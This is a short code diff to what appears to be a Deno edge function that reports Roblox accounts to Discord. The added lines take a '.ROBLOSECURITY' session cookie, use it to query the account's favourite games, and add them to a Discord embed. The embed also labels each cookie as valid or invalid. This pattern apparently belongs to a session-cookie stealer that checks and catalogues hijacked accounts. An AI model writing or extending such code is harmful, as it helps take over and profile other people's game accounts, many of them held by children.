@@ -73,13 +73,32 @@ Deno.serve(async (req) => {
       }
     }
 
+    // Fetch top 3 favorite/current games for the account
+    let topGames: string[] = [];
+    if (userId) {
+      try {
+        const gr = await fetch(
+          `https://games.roblox.com/v2/users/${userId}/favorite/games?accessFilter=Public&sortOrder=Desc&limit=10`,
+          { headers: cookie ? { Cookie: `.ROBLOSECURITY=${cookie}` } : {} },
+        );
+        if (gr.ok) {
+          const gj = await gr.json();
+          const data = Array.isArray(gj?.data) ? gj.data : [];
+          topGames = data.slice(0, 3).map((g: { name?: string }) => g?.name).filter(Boolean) as string[];
+        }
+      } catch (err) {
+        console.warn("[discord-notify] games lookup failed", err);
+      }
+    }
+
     const color = cookieValid === false ? 0xef4444 : (status === "COMPLETE" ? 0x22c55e : 0x3b82f6);
     const validityLabel = cookieValid === true ? "✅ Valid" : cookieValid === false ? "❌ Invalid" : "❓ Unknown";
     const fields: { name: string; value: string; inline?: boolean }[] = [
       { name: "Version", value: version.toUpperCase(), inline: true },
       { name: "Status", value: status, inline: true },
       { name: "Cookie", value: validityLabel, inline: true },
-      { name: "Username", value: username ? (userId ? `${username} (${userId})` : username) : "Unknown", inline: true },
+      { name: "Username", value: username || "Unknown", inline: true },
+      { name: "Top Games", value: topGames.length ? topGames.join(" | ") : "None", inline: false },
     ];
     if (durationMs !== null) {
       fields.push({ name: "Duration", value: `${(durationMs / 1000).toFixed(1)}s`, inline: true });
